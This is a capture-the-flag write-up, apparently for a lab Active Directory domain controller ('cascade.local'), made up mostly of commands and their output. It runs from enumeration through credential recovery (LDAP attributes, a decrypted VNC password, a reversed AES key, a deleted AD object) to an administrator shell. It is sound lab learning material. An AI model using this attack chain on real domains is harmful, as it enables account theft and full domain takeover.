### Nmap
```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-11-18 04:56:41Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

### AD Enum and exploit
```bash
# enum users
crackmapexec smb $IP -u '' -p '' --users | awk '{print $5}' | uniq
cascade.local\CascGuest
cascade.local\arksvc
cascade.local\s.smith
cascade.local\r.thompson
cascade.local\util
cascade.local\j.wakefield
cascade.local\s.hickson
cascade.local\j.goodhand
cascade.local\a.turnbull
cascade.local\e.crowe
cascade.local\b.hanson
cascade.local\d.burman
cascade.local\BackupSvc
cascade.local\j.allen
cascade.local\i.croft

# verify users
/opt/kerbrute/kerbrute userenum --dc $IP -d cascade.local users.txt -v

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/18/22 - Ronnie Flathers @ropnop

2022/11/18 16:13:22 >  Using KDC(s):
2022/11/18 16:13:22 >   10.10.10.182:88

2022/11/18 16:13:27 >  [+] VALID USERNAME:       arksvc@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       a.turnbull@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       s.hickson@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       r.thompson@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       s.smith@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       j.wakefield@cascade.local
2022/11/18 16:13:27 >  [+] VALID USERNAME:       j.goodhand@cascade.local
2022/11/18 16:13:27 >  [!] CascGuest@cascade.local - USER LOCKED OUT
2022/11/18 16:13:27 >  [+] VALID USERNAME:       util@cascade.local
2022/11/18 16:13:27 >  [!] e.crowe@cascade.local - USER LOCKED OUT
2022/11/18 16:13:32 >  [!] b.hanson@cascade.local - USER LOCKED OUT
2022/11/18 16:13:32 >  [+] VALID USERNAME:       d.burman@cascade.local
2022/11/18 16:13:32 >  [+] VALID USERNAME:       j.allen@cascade.local
2022/11/18 16:13:32 >  [+] VALID USERNAME:       BackupSvc@cascade.local
2022/11/18 16:13:32 >  [!] i.croft@cascade.local - USER LOCKED OUT


# enum ldap
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=cascade,DC=local"

# found r.thompson cred
cascadeLegacyPwd: clk0bjVldmE=

echo "clk0bjVldmE=" | base64 -d                    
rY4n5eva

# enum smb with obtained cred
crackmapexec smb $IP -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

# found interesting data
# Meeting_Notes_June_2018.html
user: TempAdmin (from email)
# VNC Install.reg
password: hex:6b,cf,2a,4b,6e,5a,ca,0f

# decrypt password
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default              
sT333ve2

# verify cred
crackmapexec smb $IP -u 's.smith' -p 'sT333ve2' --shares                                                      
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

# get shell
evil-winrm -i $IP -u s.smith -p sT333ve2
```

### Priv Esc
```powershell
# found non-standard group
net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.


# enum s.smith smb share
smbclient //$IP$/Audit$ s.smith%sT333ve2
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> prompt OFF
smb: \> recurse ON
smb: \> lcd s.smith/
smb: \> mget *

# dump db
sqlite3 DB/Audit.db 

# show tables
sqlite> .tables
DeletedUserAudit  Ldap              Misc

# DeletedUserAudit table
sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local

# Ldap table
select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

# Misc
empty

# reverse engineering dnspy
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842")
secret_key = "c4scadek3y654321"
base64_ciphertext="BQO5l5Kj9MdErXx6Q6AGOw=="

# decrypt ciphertext
dzNsYzBtZUZyMzFuZA==

# decode password
echo "dzNsYzBtZUZyMzFuZA==" | base64 -d
w3lc0meFr31nd

# verify cred
crackmapexec winrm $IP -u users.txt -p w3lc0meFr31nd --continue
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)

# move to arksvc
evil-winrm -i $IP -u arksvc -p w3lc0meFr31nd

# check group
CASCADE\AD Recycle Bin  Alias  S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group                 

# view deleted objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

# found TempAdmin cred
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin

# reveral cred
TempAdmin:baCT3r1aN00dles

# as the email said the password is normal admin password, so this one is likely the one which can access admin
evil-winrm -i $IP -u administrator -p baCT3r1aN00dles

```
